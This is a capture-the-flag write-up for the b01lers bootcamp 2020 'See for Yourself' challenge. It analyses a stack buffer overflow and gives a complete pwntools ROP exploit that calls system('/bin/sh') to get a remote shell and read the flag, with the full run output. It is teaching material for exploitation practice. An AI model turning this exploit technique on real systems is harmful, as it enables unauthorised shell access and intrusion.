# b01lers bootcamp CTF 2020

## See for Yourself

> 200
>
> The matrix requires a more advanced trick this time. Hack it.
>
> `nc chal.ctf.b01lers.com 1008`
> 
> [simplerop](simplerop)  
> [simplerop.c](simplerop.c)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _rop_


## Summary

Very basic ROP, with parts included.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Not a lot in place.  Perfect for ROP.


### Decompile with Ghidra

```c
int main(void)
{
  char *shellcode [1];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  system((char *)0x0);
  puts("Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.");
  read(0,shellcode,0x40);
  return 0;
}
```

The binary comes with `system` "built-in".  The question is, _is `/bin/sh` also there?_

```
# strings simplerop | grep /bin/sh
/bin/sh
```

Yep.

All that we need to know how is how far `shellcode` is from the return address on the stack:

```
char *[1]         Stack[-0x8]:8      shellcode
```

`8`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./simplerop')
binary.plt['system'] = 0x401080 # see .plt.sec in ghidra or GDB output
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.ctf.b01lers.com', 1008)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = 0x8 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binary.search(b'/bin/sh').__next__())
payload += p64(binary.plt.system)

p.sendline(payload)
p.interactive()
```

Normally I get any linked in function with `binary.plt.functionname`, but newer libc I assume moved that to `.plt.sec` and pwntools does not search that (yet).  After finding with Ghidra and checking with GDB, I just manually added the location.

The rest is standard fare CTF no-PIE ROP:

1. Find a `pop rdi` gadget
2. Create a payload to call `system`

> The `pop_rdi + 1` = `ret` and is there to align the stack for `system`.

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/b01lersbootcampctf2020/see_for_yourself/simplerop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.ctf.b01lers.com on port 1008: Done
[*] Loaded 13 cached gadgets for './simplerop'
[*] Switching to interactive mode
Unfortunately, no one can be told what the Matrix is. You have to see it for yourself.
$ id
uid=1000(simplerop) gid=1000(simplerop) groups=1000(simplerop)
$ ls -l
total 36
-r-xr-x--- 1 root simplerop    89 Oct  2 18:33 Makefile
-r--r----- 1 root simplerop    24 Oct  2 18:33 flag.txt
-r-xr-x--- 1 root simplerop 19672 Oct  3 04:08 simplerop
-r-xr-x--- 1 root simplerop   339 Oct  2 18:33 simplerop.c
-r-xr-x--- 1 root simplerop    47 Oct  2 18:33 wrapper.sh
$ cat flag.txt
flag{ROP_ROOP_OOP_OOPS}
```

